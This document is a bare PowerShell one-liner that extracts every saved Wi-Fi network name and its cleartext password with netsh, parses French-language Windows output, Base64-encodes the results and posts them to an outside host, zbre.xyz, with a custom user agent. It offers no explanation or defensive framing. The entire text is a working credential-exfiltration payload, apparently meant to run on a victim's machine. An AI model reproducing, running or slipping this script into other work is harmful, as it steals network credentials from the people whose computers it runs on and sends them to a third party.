$a=netsh wlan show profiles|Select-String '\:(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$_}|%{(netsh wlan show profile name=$n key=clear)};$b=@();$reg='(Nom du SSID\s+: "([^"]+)".+?Cl[\u00e9] de s[\u00e9]curit[\u00e9]\s+: (\S+).+?Contenu de la cl[\u00e9]\s+: (\S+))';[regex]::Matches($a,$reg,'Singleline') | ForEach-Object{$ssid=$_.Groups[2].Value;$s=$_.Groups[3].Value -match 'Pr[\u00e9]sent';$t=if ($s){$_.Groups[4].Value}else{'Aucune'}$b+=[PSCustomObject]@{SSID=$ssid;Cle=$t}};$c=$b|Out-String;$d=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($c));$r=iwr -Uri "http://zbre.xyz/test" -UserAgent "ZBREW" -Method Post -Body $d -ContentType "text/plain";
